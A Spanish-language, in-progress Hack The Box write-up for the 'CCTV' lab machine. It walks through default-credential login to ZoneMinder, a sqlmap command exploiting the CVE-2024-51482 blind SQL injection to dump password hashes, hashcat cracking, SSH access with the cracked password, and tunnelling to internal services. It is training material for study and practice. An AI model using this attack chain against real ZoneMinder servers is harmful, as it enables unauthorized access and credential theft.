# CCTV — HTB (Writeup)

> **Autor:** Ángel de la Vega Cuevas
> **Objetivo:** Documentar el proceso de acceso y escalada de privilegios en la máquina *CCTV* (HTB/lab) para laboratorio o repositorio personal.

---

## Resumen

Se enumeró un servicio web con **ZoneMinder**, vulnerable a **SQL injection ciega** (**CVE-2024-51482**). Mediante `sqlmap` se extrajeron credenciales hasheadas de la base de datos. Tras crackear el hash del usuario `mark` se obtuvo acceso por SSH. Internamente se identificaron servicios adicionales (MotionEye) pendientes de analizar.

> ⚠️ Writeup en progreso — escalada a root pendiente.

---

## 1) Descubrimiento

* **IP objetivo (lab):** `10.129.10.176` / `cctv.htb`
* **OS detectado:** Linux (TTL=63)
* **Servicios detectados:** SSH (22/tcp), HTTP (80/tcp)

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.10.176 -oG cctv
```

Añadir el dominio al `/etc/hosts` para que resuelva correctamente:

```bash
sudo nano /etc/hosts
# Añadir: 10.129.10.176   cctv.htb
```

---

## 2) Enumeración web

Al acceder a `http://cctv.htb` se identifica un panel de **ZoneMinder** con un botón de *Staff Login* en la parte superior derecha.

Las credenciales por defecto `admin:admin` permiten el acceso al panel de administración.

Dentro de la interfaz de ZoneMinder se identifican tres usuarios:

- `admin`
- `mark`
- `superadmin`

Se intentaron credenciales comunes para `mark` y `superadmin` sin éxito.

---

## 3) Explotación (CVE-2024-51482 — Blind SQL Injection)

### Descripción de la vulnerabilidad

**CVE-2024-51482** es una vulnerabilidad de **SQL injection ciega (blind)** en ZoneMinder. Afecta al parámetro `tid` del endpoint:

```
/zm/index.php?view=request&request=event&action=removetag&tid=<payload>
```

### ¿Por qué funciona?

El parámetro `tid` se inserta directamente en una consulta SQL sin sanitización ni uso de prepared statements. Al ser una inyección **ciega**, el servidor no devuelve el resultado de la consulta directamente en la respuesta — en su lugar, la aplicación tarda más o menos en responder según si la condición inyectada es verdadera o falsa. Esto se conoce como **Time-Based Blind SQL Injection**.

El flujo de explotación es:

1. El atacante inyecta una condición como `IF(1=1, SLEEP(2), 0)` en el parámetro `tid`.
2. Si la aplicación tarda ~2 segundos en responder, la condición es verdadera.
3. Repitiendo este proceso carácter a carácter se puede reconstruir cualquier dato de la base de datos — en este caso, los hashes de contraseñas de los usuarios.

Para explotar esta vulnerabilidad es necesario estar **autenticado** — se necesita la cookie de sesión `ZMSESSID`, obtenible desde el navegador tras hacer login (`F12 → Storage → Cookies`).

### Explotación con sqlmap

```bash
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
  -D zm -T Users -C Username,Password \
  --dump \
  --batch \
  --dbms=MySQL \
  --technique=T \
  --cookie="ZMSESSID=<tu_cookie>" \
  --time-sec=2
```

**Explicación de los parámetros:**

| Parámetro | Función |
|-----------|---------|
| `-u` | URL objetivo con el parámetro vulnerable |
| `-D zm` | Base de datos objetivo (`zm` es la de ZoneMinder) |
| `-T Users` | Tabla objetivo |
| `-C Username,Password` | Columnas a extraer |
| `--dump` | Vuelca el contenido de las columnas |
| `--batch` | Responde automáticamente a las preguntas interactivas |
| `--dbms=MySQL` | Especifica el motor de base de datos |
| `--technique=T` | Usa únicamente la técnica Time-Based Blind |
| `--cookie` | Proporciona la sesión autenticada |
| `--time-sec=2` | Umbral de tiempo en segundos para detectar respuestas verdaderas |

Resultado obtenido:

```
+------------+--------------------------------------------------------------+
| Username   | Password                                                     |
+------------+--------------------------------------------------------------+
| superadmin | $2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm |
| mark       | $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG. |
| admin      | $2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m |
+------------+--------------------------------------------------------------+
```

Los hashes están en formato **bcrypt** (`$2y$10$...`).

---

## 4) Crackeo de hashes (bcrypt)

Los hashes bcrypt son computacionalmente costosos — el factor de coste `10` hace que cada intento sea lento (~200 hashes/segundo en CPU). Se usó hashcat con el modo 3200:

```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

Resultado:

| Usuario | Contraseña |
|---------|-----------|
| `mark` | `opensesame` |

Los hashes de `superadmin` y `admin` no se crackearon con rockyou.

---

## 5) Acceso inicial (SSH)

```bash
ssh mark@10.129.10.176
# Password: opensesame
```

---

## 6) Enumeración interna

Una vez dentro se identificaron servicios escuchando únicamente en localhost:

```bash
ss -tlnp
```

| Dirección | Puerto | Servicio |
|-----------|--------|---------|
| 127.0.0.1 | 8765 | MotionEye |
| 127.0.0.1 | 7999 | MotionHTTP |
| 127.0.0.1 | 9081 | MJPEG Stream |

Estos servicios no son accesibles desde fuera — requieren **port forwarding** para interactuar con ellos desde Kali:

```bash
ssh -L 8765:127.0.0.1:8765 mark@10.129.10.176
```

---

## 7) Flags

| Flag | Hash |
|------|------|
| `user.txt` | `[pendiente]` |
| `root.txt` | `[pendiente]` |

---

## 8) Notas técnicas

- Las credenciales por defecto `admin:admin` en ZoneMinder son un hallazgo crítico en entornos reales — siempre probar credenciales por defecto antes de buscar exploits.
- La inyección es **ciega basada en tiempo** — no hay output visible, solo diferencias de latencia. Por eso `sqlmap` con `--technique=T` es la herramienta adecuada.
- El formato bcrypt `$2y$10$` con factor de coste 10 hace que crackear sea muy lento en CPU. Si rockyou no funciona, considerar reducir el wordlist o usar GPU.
- Los servicios internos en los puertos 8765, 7999 y 9081 requieren **SSH tunneling** o **chisel** para acceder desde Kali.
